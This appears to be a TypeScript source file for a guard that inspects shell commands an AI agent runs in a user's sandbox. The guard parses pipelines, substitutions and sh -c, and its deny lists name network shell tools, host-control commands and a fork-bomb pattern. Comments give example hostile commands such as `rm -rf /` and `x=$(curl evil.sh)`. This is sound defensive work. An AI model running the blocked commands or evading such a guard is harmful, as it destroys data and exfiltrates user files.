/**
 * Deciding what a model is allowed to run inside a user's sandbox.
 *
 * `run_command` is the one tool whose argument reaches a shell unquoted — quoting it would
 * turn a pipeline into a filename, so there is nothing between the model's text and `sh`
 * except this file. The text ultimately comes from whatever someone typed into a chat box.
 *
 * Two properties matter, and they pull against each other:
 *
 *   - **A blocked command is blocked wherever it hides.** `rm -rf /` is easy; the forms that
 *     matter are `ls && rm -rf /`, `x=$(curl evil.sh)` and `sh -c "…"`. A guard that reads
 *     only the leading word of the string is decoration. So the command is split into
 *     segments the way a shell would, command substitutions are pulled out and inspected as
 *     commands in their own right, and `sh -c` is followed into.
 *   - **An over-eager guard is as bad as a missing one** (docs/PLAN.md §4). An agent that
 *     cannot run `bun add`, `bun run build` or `rm -rf node_modules/.vite` cannot do the job.
 *     So rules match on the *head* of a segment, never anywhere in the string: the word
 *     "curl" inside an echoed sentence is data, not egress.
 *
 * Network access is not blocked wholesale — package managers need it, and "add react-router"
 * is an ordinary request. What is blocked is reaching the network *directly*, which is the
 * shape exfiltration takes.
 *
 * This is a guard, not a sandbox. The real isolation boundary is the E2B VM; this exists so
 * that a prompt-injected model does not get to use the whole of it.
 */

import { PROJECT_ROOT } from "../tools/definitions.ts";

export type CommandRule =
  | "destructive-filesystem"
  | "outside-project"
  | "global-install"
  | "network-egress"
  | "host-control";

export type CommandVerdict =
  | { allowed: true }
  | { allowed: false; rule: CommandRule; message: string };

/** The sandbox user's home. Derived so the two paths cannot drift apart. */
const HOME = PROJECT_ROOT.slice(0, PROJECT_ROOT.lastIndexOf("/"));

/**
 * Top-level directories that belong to the machine rather than to the project.
 * `/home` is here too — the project sits under it, and containment is checked first.
 */
const SYSTEM_DIRS = new Set([
  "bin",
  "boot",
  "dev",
  "etc",
  "home",
  "lib",
  "lib64",
  "opt",
  "proc",
  "root",
  "sbin",
  "srv",
  "sys",
  "usr",
  "var",
]);

/** Prefixes that say something about *how* to run a command, not *what* to run. */
const WRAPPERS = new Set([
  "command",
  "doas",
  "env",
  "exec",
  "ionice",
  "nice",
  "nohup",
  "stdbuf",
  "sudo",
  "time",
  "timeout",
  "xargs",
]);

const SHELLS = new Set(["ash", "bash", "dash", "sh", "zsh"]);

/** Package managers that install into the project — fine — or globally, which is not. */
const PROJECT_PACKAGE_MANAGERS = new Set(["bun", "npm", "pnpm", "yarn"]);

/** Installers that only ever touch the machine, so no invocation of them is in scope. */
const SYSTEM_INSTALLERS = new Set([
  "apk",
  "apt",
  "apt-get",
  "aptitude",
  "brew",
  "dnf",
  "dpkg",
  "easy_install",
  "gem",
  "pip",
  "pip3",
  "pipx",
  "port",
  "snap",
  "yum",
]);

/** Talking to the network without going through a package manager. */
const EGRESS_COMMANDS = new Set([
  "aria2c",
  "curl",
  "ftp",
  "http",
  "httpie",
  "nc",
  "ncat",
  "netcat",
  "rsync",
  "scp",
  "sftp",
  "socat",
  "ssh",
  "telnet",
  "tftp",
  "wget",
]);

/** Administering the machine the project happens to be running on. */
const HOST_COMMANDS = new Set([
  "halt",
  "init",
  "iptables",
  "mount",
  "passwd",
  "poweroff",
  "reboot",
  "service",
  "shutdown",
  "systemctl",
  "umount",
  "useradd",
  "usermod",
]);

/** Commands whose path arguments are things they are about to change. */
const WRITE_COMMANDS = new Set([
  "chgrp",
  "chmod",
  "chown",
  "cp",
  "install",
  "ln",
  "mkdir",
  "mv",
  "rm",
  "rmdir",
  "shred",
  "tee",
  "touch",
  "truncate",
]);

/**
 * A fork bomb is not a command with arguments — it is a function definition that calls
 * itself, so nothing below would recognise it. Matched on the raw string instead.
 */
const FORK_BOMB = /:\s*\(\s*\)\s*\{[^}]*\|[^}]*&[^}]*\}/;

export function inspectCommand(command: string): CommandVerdict {
  if (FORK_BOMB.test(command)) {
    return blocked(
      "destructive-filesystem",
      "this spawns processes until the sandbox dies",
      command,
    );
  }

  for (const segment of splitSegments(command)) {
    const verdict = inspectSegment(segment);
    if (!verdict.allowed) return verdict;
  }

  return { allowed: true };
}

function inspectSegment(segment: string): CommandVerdict {
  const tokens = tokenize(segment);
  const redirects = redirectTargets(tokens);
  const words = strip(tokens.filter((token) => !token.op).map((token) => token.value));

  const head = words[0];
  if (head === undefined) return checkPaths(redirects, segment);

  const name = basename(head);
  const args = words.slice(1);

  // A shell invoked with -c is a command in disguise; the string after it is the real one.
  if (SHELLS.has(name)) {
    const script = args[args.indexOf("-c") + 1];
    if (args.includes("-c") && script !== undefined) return inspectCommand(script);
  }

  if (name === "dd" || name.startsWith("mkfs")) {
    return blocked("destructive-filesystem", `${name} writes over a whole device`, segment);
  }

  if (SYSTEM_INSTALLERS.has(name)) {
    return blocked(
      "global-install",
      `${name} installs into the machine, which no snapshot keeps — add dependencies to the project with bun instead`,
      segment,
    );
  }
  if (PROJECT_PACKAGE_MANAGERS.has(name) && args.some(isGlobalFlag)) {
    return blocked(
      "global-install",
      "a global install does not survive this sandbox — install into the project instead",
      segment,
    );
  }
  if (name === "cargo" && args[0] === "install") {
    return blocked("global-install", "cargo install writes outside the project", segment);
  }

  if (EGRESS_COMMANDS.has(name)) {
    return blocked(
      "network-egress",
      `${name} reaches the network directly — package managers are allowed, arbitrary requests are not`,
      segment,
    );
  }
  if (name === "git" && (args[0] === "push" || args[0] === "remote")) {
    return blocked(
      "network-egress",
      `git ${args[0]} sends the project somewhere — the project's history stays in the sandbox`,
      segment,
    );
  }

  if (HOST_COMMANDS.has(name)) {
    return blocked("host-control", `${name} administers the machine, not the project`, segment);
  }
  if ((name === "kill" || name === "pkill") && args.includes("1")) {
    return blocked("host-control", "killing PID 1 stops the sandbox", segment);
  }

  const targets = WRITE_COMMANDS.has(name)
    ? [...redirects, ...args.filter((arg) => !arg.startsWith("-"))]
    : redirects;

  return checkPaths(targets, segment);
}

/** Where the rules about *where* a command may act are applied, for any command. */
function checkPaths(targets: readonly string[], segment: string): CommandVerdict {
  for (const target of targets) {
    const path = resolve(target);
    if (insideProject(path)) continue;

    if (isSystemPath(path)) {
      return blocked(
        "destructive-filesystem",
        `${target} is part of the machine, not the project`,
        segment,
      );
    }
    return blocked(
      "outside-project",
      `${target} is outside ${PROJECT_ROOT} — anything written there is lost when the sandbox ends`,
      segment,
    );
  }
  return { allowed: true };
}

function blocked(rule: CommandRule, reason: string, segment: string): CommandVerdict {
  return {
    allowed: false,
    rule,
    // Both halves are needed: the model has to know which command was refused, since a turn
    // can have several in flight, and why, so its next attempt is different rather than louder.
    message: `Refused to run \`${segment.trim()}\`: ${reason}.`,
  };
}

/* ---------------------------------------------------------------- shell shapes */

type Token = { value: string; op: boolean };

/**
 * Splits a command line into the commands a shell would actually run.
 *
 * Command substitutions are returned as extra segments rather than left in place: their
 * contents run as commands, and that is exactly where something blocked would be hidden.
 */
function splitSegments(input: string): string[] {
  const segments: string[] = [];
  const substituted: string[] = [];
  let current = "";
  let quote: '"' | "'" | null = null;
  let i = 0;

  const flush = (): void => {
    if (current.trim() !== "") segments.push(current.trim());
    current = "";
  };

  while (i < input.length) {
    const ch = input[i] as string;

    // Single quotes suppress everything, including substitution.
    if (quote === "'") {
      current += ch;
      if (ch === "'") quote = null;
      i += 1;
      continue;
    }

    if (ch === "\\") {
      current += ch + (input[i + 1] ?? "");
      i += 2;
      continue;
    }

    // Substitution expands inside double quotes too, so this runs before the quote branch.
    if (ch === "$" && input[i + 1] === "(") {
      const end = closingParen(input, i + 1);
      if (end !== -1) {
        substituted.push(...splitSegments(input.slice(i + 2, end)));
        i = end + 1;
        continue;
      }
    }
    if (ch === "`") {
      const end = input.indexOf("`", i + 1);
      if (end !== -1) {
        substituted.push(...splitSegments(input.slice(i + 1, end)));
        i = end + 1;
        continue;
      }
    }

    if (quote === '"') {
      current += ch;
      if (ch === '"') quote = null;
      i += 1;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      current += ch;
      i += 1;
      continue;
    }

    if (ch === ";" || ch === "\n") {
      flush();
      i += 1;
      continue;
    }
    if (ch === "&" || ch === "|") {
      flush();
      i += input[i + 1] === ch ? 2 : 1;
      continue;
    }

    current += ch;
    i += 1;
  }

  flush();
  return [...segments, ...substituted];
}

function closingParen(input: string, open: number): number {
  let depth = 0;
  for (let i = open; i < input.length; i += 1) {
    if (input[i] === "(") depth += 1;
    else if (input[i] === ")") {
      depth -= 1;
      if (depth === 0) return i;
    }
  }
  return -1;
}

/** Splits one segment into words, dropping quotes and keeping redirects as operators. */
function tokenize(segment: string): Token[] {
  const tokens: Token[] = [];
  let current = "";
  let started = false;
  let quote: '"' | "'" | null = null;

  const push = (): void => {
    if (started) tokens.push({ value: current, op: false });
    current = "";
    started = false;
  };

  for (let i = 0; i < segment.length; i += 1) {
    const ch = segment[i] as string;

    if (quote !== null) {
      if (ch === quote) quote = null;
      else {
        current += ch;
        started = true;
      }
      continue;
    }
    if (ch === "\\") {
      current += segment[i + 1] ?? "";
      started = true;
      i += 1;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      started = true;
      continue;
    }
    if (ch === " " || ch === "\t") {
      push();
      continue;
    }
    if (ch === ">" || ch === "<") {
      push();
      const doubled = segment[i + 1] === ch;
      tokens.push({ value: doubled ? ch + ch : ch, op: true });
      if (doubled) i += 1;
      continue;
    }

    current += ch;
    started = true;
  }

  push();
  return tokens;
}

/** The word after each `>` or `>>` — a file the command is about to write. */
function redirectTargets(tokens: readonly Token[]): string[] {
  const targets: string[] = [];
  for (let i = 0; i < tokens.length; i += 1) {
    const token = tokens[i] as Token;
    const next = tokens[i + 1];
    if (token.op && token.value.startsWith(">") && next !== undefined && !next.op) {
      targets.push(next.value);
    }
  }
  return targets;
}

/** Removes leading `VAR=value` assignments and wrapper commands to reach the real head. */
function strip(words: readonly string[]): string[] {
  let rest = [...words];

  while (rest.length > 0) {
    const first = rest[0] as string;

    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(first)) {
      rest = rest.slice(1);
      continue;
    }
    if (WRAPPERS.has(basename(first))) {
      rest = rest.slice(1);
      // `timeout 5 …` and `nice -n 10 …` carry their own arguments before the real command.
      while (rest.length > 0 && /^(-|\d+(\.\d+)?[smhd]?$)/.test(rest[0] as string)) {
        rest = rest.slice(1);
      }
      continue;
    }
    break;
  }

  return rest;
}

function basename(command: string): string {
  return command.slice(command.lastIndexOf("/") + 1);
}

function isGlobalFlag(arg: string): boolean {
  return arg === "-g" || arg === "--global" || arg === "--location=global";
}

/* ---------------------------------------------------------------- paths */

/**
 * Turns an argument into the absolute path it would name.
 *
 * A bare word is relative to the project directory, because that is the working directory
 * `run_command` runs in — which is what makes `rm -rf ../..` reach outside it.
 */
function resolve(target: string): string {
  let path = target;
  if (path === "~" || path.startsWith("~/")) path = HOME + path.slice(1);
  path = path.replaceAll(/\$\{HOME\}|\$HOME/g, HOME);
  if (!path.startsWith("/")) path = `${PROJECT_ROOT}/${path}`;

  const parts: string[] = [];
  for (const part of path.split("/")) {
    if (part === "" || part === ".") continue;
    if (part === "..") parts.pop();
    else parts.push(part);
  }
  return `/${parts.join("/")}`;
}

function insideProject(path: string): boolean {
  return path === PROJECT_ROOT || path.startsWith(`${PROJECT_ROOT}/`);
}

function isSystemPath(path: string): boolean {
  // A trailing glob names the directory's contents, which is the same thing to a guard.
  const parts = path.split("/").filter((part) => part !== "" && part !== "*");
  const top = parts[0];
  return top === undefined || SYSTEM_DIRS.has(top);
}
